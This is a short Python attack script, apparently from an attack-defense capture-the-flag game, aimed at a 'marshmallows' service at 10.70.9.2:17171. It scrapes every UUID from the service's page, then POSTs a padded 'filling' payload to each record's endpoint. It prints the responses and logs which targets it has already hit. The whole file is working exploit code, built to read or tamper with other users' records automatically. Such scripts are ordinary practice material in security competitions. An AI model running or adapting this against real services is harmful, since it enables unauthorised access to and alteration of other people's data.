#!/usr/bin/env python
# -*- coding: utf-8 -*-
import sys, re, requests, requests.cookies
import string, random, uuid, re,json
from storage import storage_set, storage_get
import hashlib

ip = '10.70.9.2'

s = requests.Session()


payload = {
    'filling' : 'RRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRR'
}

html = s.get('http://{}:17171/marshmallows'.format(ip), timeout=(None,None))
uuids = re.findall('[0-9a-fA-F]{8}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{12}',html.text)
set_uuids = set(uuids)

header = {'User-Agent' : 'python-requests/2.21.0'}

for uid in set_uuids:
    if not storage_get(ip + ':' + uid):
        html = s.post('http://{}:17171/marshmallows/{}'.format(ip, uid), data=json.dumps(payload), headers=header)
        print(html.text)
        storage_set(ip + ':' + uid)




